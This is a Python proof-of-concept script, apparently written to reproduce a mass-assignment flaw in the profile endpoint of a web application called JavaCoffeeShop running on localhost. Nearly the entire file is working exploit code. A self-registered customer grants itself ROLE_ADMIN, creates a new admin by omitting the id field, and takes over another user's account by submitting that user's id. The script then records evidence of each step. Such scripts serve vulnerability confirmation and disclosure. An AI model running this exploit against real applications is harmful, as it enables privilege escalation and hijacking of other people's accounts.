#!/usr/bin/env python3
"""Mass assignment on POST /profile for a self-registered customer.

Prereq: JavaCoffeeShop is listening on $BASE (default http://127.0.0.1:8082).
"""
import json
import os
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar
from pathlib import Path

BASE = os.environ.get("BASE", "http://127.0.0.1:8082")
HERE = Path(__file__).resolve().parent
EVIDENCE = HERE / "evidence"
EVIDENCE.mkdir(exist_ok=True)
LOG = []


class RecordingRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        LOG.append(
            {
                "kind": "redirect",
                "status": code,
                "location": newurl,
                "set_cookie": headers.get("Set-Cookie"),
            }
        )
        return super().redirect_request(req, fp, code, msg, headers, newurl)


def client():
    jar = CookieJar()
    opener = urllib.request.build_opener(
        RecordingRedirect(), urllib.request.HTTPCookieProcessor(jar)
    )
    return opener


def call(opener, method, path, form=None):
    data = None
    headers = {}
    if form is not None:
        data = urllib.parse.urlencode(form).encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(BASE + path, data=data, method=method, headers=headers)
    try:
        resp = opener.open(req, timeout=30)
        body = resp.read()
        status = resp.status
        hdrs = dict(resp.headers)
        final = resp.geturl()
    except urllib.error.HTTPError as exc:
        body = exc.read()
        status = exc.code
        hdrs = dict(exc.headers)
        final = BASE + path
    text = body.decode("utf-8", "replace")
    entry = {
        "request": f"{method} {path}",
        "form": form,
        "status": status,
        "final_url": final,
        "content_type": hdrs.get("Content-Type"),
        "body_excerpt": text[:500],
    }
    LOG.append(entry)
    return status, text


def register(opener, username, email, password):
    return call(
        opener,
        "POST",
        "/register",
        {
            "username": username,
            "email": email,
            "password": password,
            "passwordConfirm": password,
        },
    )


def login(opener, username, password):
    return call(opener, "POST", "/login", {"username": username, "password": password})


def people():
    status, text = call(client(), "GET", "/api/v1/person")
    return status, json.loads(text)


def find_user(rows, username):
    for row in rows:
        if row.get("username") == username:
            return row
    return None


def profile_form(person, password, roles):
    form = {
        "username": person["username"],
        "email": person["email"],
        "password": password,
        "passwordConfirm": password,
        "firstName": person.get("firstName") or "Poc",
        "lastName": person.get("lastName") or "User",
        "phone": person.get("phone") or "",
        "address": person.get("address") or "1 Local St",
        "enable": "true",
        "profilePic": person.get("profilePic") or "default-profile-picture.jpg",
        "roles": roles,
    }
    if person.get("id") is not None:
        form["id"] = str(person["id"])
    return form


def main():
    password = "Local-repro-1"
    summary = {}

    # --- self promotion ---
    attacker = client()
    register(attacker, "poc-customer", "poc-customer@example.test", password)
    login(attacker, "poc-customer", password)
    status, _ = call(attacker, "GET", "/persons")
    summary["persons_before"] = status
    _, rows = people()
    me = find_user(rows, "poc-customer")
    if not me:
        raise SystemExit("registered customer missing from /api/v1/person")
    summary["role_before"] = me["roles"]
    call(attacker, "POST", "/profile", profile_form(me, password, "ROLE_ADMIN"))
    _, rows = people()
    me = find_user(rows, "poc-customer")
    summary["role_after_profile"] = me["roles"]
    relogin = client()
    login(relogin, "poc-customer", password)
    status, persons_body = call(relogin, "GET", "/persons")
    summary["persons_after_relogin"] = status
    summary["persons_page_has_customer"] = "poc-customer" in persons_body

    # --- omit id: insert a new admin ---
    creator = client()
    register(creator, "poc-omit", "poc-omit@example.test", password)
    login(creator, "poc-omit", password)
    fresh = {
        "id": None,
        "username": "poc-new-admin",
        "email": "poc-new-admin@example.test",
        "firstName": "New",
        "lastName": "Admin",
        "phone": "",
        "address": "1 Local St",
        "profilePic": "default-profile-picture.jpg",
    }
    call(creator, "POST", "/profile", profile_form(fresh, password, "ROLE_ADMIN"))
    _, rows = people()
    created = find_user(rows, "poc-new-admin")
    summary["omitted_id_user"] = None if not created else {
        "id": created["id"],
        "roles": created["roles"],
    }
    created_session = client()
    login(created_session, "poc-new-admin", password)
    status, _ = call(created_session, "GET", "/persons")
    summary["omitted_id_persons"] = status

    # --- other user's id ---
    victim = client()
    register(victim, "poc-victim", "poc-victim@example.test", password)
    _, rows = people()
    victim_row = find_user(rows, "poc-victim")
    taker = client()
    register(taker, "poc-taker", "poc-taker@example.test", password)
    login(taker, "poc-taker", password)
    stolen = {
        "id": victim_row["id"],
        "username": "poc-owned-victim",
        "email": "poc-owned@example.test",
        "firstName": "Owned",
        "lastName": "Victim",
        "phone": "",
        "address": "1 Local St",
        "profilePic": "default-profile-picture.jpg",
    }
    call(taker, "POST", "/profile", profile_form(stolen, "Owned-pass-1", "ROLE_CUSTOMER"))
    _, rows = people()
    summary["old_victim_still_present"] = find_user(rows, "poc-victim") is not None
    owned = find_user(rows, "poc-owned-victim")
    summary["takeover_row"] = None if not owned else {
        "id": owned["id"],
        "username": owned["username"],
        "roles": owned["roles"],
    }
    owned_session = client()
    login(owned_session, "poc-owned-victim", "Owned-pass-1")
    status, profile_body = call(owned_session, "GET", "/profile")
    summary["takeover_profile_status"] = status
    summary["takeover_profile_has_username"] = "poc-owned-victim" in profile_body

    self_ok = (
        summary["persons_before"] == 403
        and summary["role_before"] == "ROLE_CUSTOMER"
        and summary["role_after_profile"] == "ROLE_ADMIN"
        and summary["persons_after_relogin"] == 200
    )
    omit_ok = (
        summary["omitted_id_user"]
        and summary["omitted_id_user"]["roles"] == "ROLE_ADMIN"
        and summary["omitted_id_persons"] == 200
    )
    take_ok = (
        summary["old_victim_still_present"] is False
        and summary["takeover_row"]
        and summary["takeover_row"]["id"] == victim_row["id"]
        and summary["takeover_profile_status"] == 200
        and summary["takeover_profile_has_username"]
    )
    reproduced = "yes" if self_ok and omit_ok and take_ok else "partial" if self_ok else "no"
    summary["reproduced"] = reproduced
    summary["checks"] = {"self": self_ok, "omit_id": omit_ok, "takeover": take_ok}

    (EVIDENCE / "summary.json").write_text(json.dumps(summary, indent=2))
    (EVIDENCE / "transcript.json").write_text(json.dumps(LOG, indent=2))
    print(json.dumps(summary, indent=2))
    if reproduced != "yes":
        raise SystemExit(1)


if __name__ == "__main__":
    main()
